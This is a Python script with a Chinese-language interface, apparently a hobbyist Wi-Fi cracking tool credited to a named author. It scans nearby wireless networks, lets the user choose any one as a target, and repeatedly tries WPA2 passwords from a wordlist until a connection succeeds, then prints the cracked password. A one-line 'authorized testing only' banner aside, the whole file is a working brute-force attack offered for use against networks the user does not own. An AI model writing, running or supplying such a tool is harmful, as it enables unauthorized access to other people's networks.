import os
import sys
import time
import pywifi
from pywifi import const
from termcolor import colored, cprint

# ====== 初始化界面 ======
os.system("clear")
print(colored("警告: 本工具仅限授权测试使用！".center(50), "red", attrs=["bold"]))
ps_ta = r"""
   .               .
 .´  ·  .     .  ·  `.      WIFI爆破测试
 :  :  :  (¯)  :  :  :      作者:孤傲的剑锋
 `.  ·  ` /¯\ ´  ·  .´     QQ:3640647027
   `     /¯¯¯\     ´    
"""
print(colored(ps_ta, "cyan"))

# ====== 密钥验证 ======
HACKER_KEY = "Hacker001"
while True:
    try:
        user_input = input(colored("\n请输入启动密钥: ", "yellow"))
        if user_input == HACKER_KEY:
            print(colored("√ 验证通过，正在初始化...", "green"))
            break
        else:
            print(colored("× 无效密钥，请重试！", "red"))
    except KeyboardInterrupt:
        sys.exit(colored("\n程序已终止", "red"))

# ====== 伪进度条 ======
def show_progress():
    total = 30
    for i in range(total + 1):
        percent = (i / total) * 100
        bar = "▓" * int(percent/3.3) + " " * (30 - int(percent/3.3))
        sys.stdout.write(f"\r{colored('初始化进度:', 'cyan')} |{bar}| {percent:.1f}%")
        sys.stdout.flush()
        time.sleep(0.1)
    print("\n")

show_progress()

# ====== WiFi扫描模块 ======
def wifi_scanner():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    
    # 执行扫描
    print(colored("[+] 开始扫描附近WiFi...", "blue"))
    iface.scan()
    
    # 动态进度显示
    for i in range(1, 6):
        time.sleep(0.5)
        sys.stdout.write(f"\r扫描进度: {'■'*i}{'□'*(5-i)} {i*20}%")
        sys.stdout.flush()
    
    # 处理结果
    results = iface.scan_results()
    seen = set()
    wifi_list = []
    
    for ap in results:
        ssid = ap.ssid.encode('raw_unicode_escape').decode('utf-8')
        if ssid and ssid not in seen:
            seen.add(ssid)
            wifi_list.append({
                "ssid": ssid,
                "signal": 100 + ap.signal,
                "auth": const.AUTH_ALG_OPEN,
                "akm": [t for t in ap.akm]
            })
    
    return sorted(wifi_list, key=lambda x: x["signal"], reverse=True)

# ====== 破解模块 ======
def wifi_cracker(ssid, dict_path="/storage/emulated/0/passwords.txt/"):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    
    try:
        with open(dict_path) as f:
            passwords = [p.strip() for p in f.readlines()]
    except FileNotFoundError:
        print(colored(f"[!] 字典文件 {dict_path} 不存在！", "red"))
        return False

    print(colored(f"\n[*] 开始破解: {ssid}", "yellow", attrs=["bold"]))
    
    for idx, pwd in enumerate(passwords, 1):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm = const.AKM_TYPE_WPA2PSK
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd

        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        
        # 连接测试
        iface.connect(tmp_profile)
        for _ in range(6):
            time.sleep(0.5)
            status = iface.status()
            if status == const.IFACE_CONNECTED:
                print(colored(f"\n[+] 破解成功！密码: {pwd}", "green", attrs=["bold"]))
                return True
            elif status == const.IFACE_DISCONNECTED:
                break
        
        # 进度显示
        sys.stdout.write(f"\r尝试进度: {idx}/{len(passwords)} | 当前测试: {pwd.ljust(12)}")
        sys.stdout.flush()
    
    print(colored("\n[!] 字典穷举失败！", "red"))
    return False

# ====== 主程序 ======
if __name__ == "__main__":
    # 扫描WiFi
    targets = wifi_scanner()
    
    # 显示结果
    print("\n" + "-"*40)
    print(colored("{:<4}{:<8}{}".format("ID", "强度", "WiFi名称"), "magenta"))
    for idx, ap in enumerate(targets):
        print(f"{idx:<4}{ap['signal']:<8}{ap['ssid']}")
    
    # 选择目标
    try:
        target_id = int(input(colored("\n请输入目标ID: ", "yellow")))
        target_ssid = targets[target_id]["ssid"]
    except (ValueError, IndexError):
        sys.exit(colored("[!] 输入无效！", "red"))

    # 执行破解
    if wifi_cracker(target_ssid):
        print(colored("-"*40 + "\n已成功连接！\n", "green"))
    else:
        print(colored("-"*40 + "\n破解失败，请尝试其他字典！\n", "red"))
        
